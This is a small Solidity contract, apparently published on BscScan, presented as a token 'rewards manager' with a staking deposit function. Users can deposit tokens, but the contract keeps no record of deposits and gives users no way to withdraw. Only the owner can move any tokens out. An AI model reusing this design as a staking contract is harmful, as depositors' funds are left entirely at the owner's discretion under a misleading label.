/**
 *Submitted for verification at BscScan.com on 2022-09-17
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.13;


/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract TikkyManager {
    string public name = "TIKKY INU REWARDS MANAGER";
    IBEP20 public tikkyInu;
    address public owner;


    constructor(IBEP20 _tikkyInu)  payable {
        tikkyInu = _tikkyInu;

        //assigning owner on deployment
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    //stake tokens function

    function Deposit(uint256 _amount) public {
        require(_amount > 0, "amount cannot be 0");
        tikkyInu.transferFrom(msg.sender, address(this), _amount);
    }

    //claim test 1000 Tst (for testing purpose only !!)
    function Claim( uint256 _amount) public onlyOwner {
        tikkyInu.transfer(msg.sender, _amount);
    }
    
    function sendTokens(address tokenAddress, uint256 amount,address to) public onlyOwner returns (bool success) {
        return IBEP20(tokenAddress).transfer(to, amount);
    }

}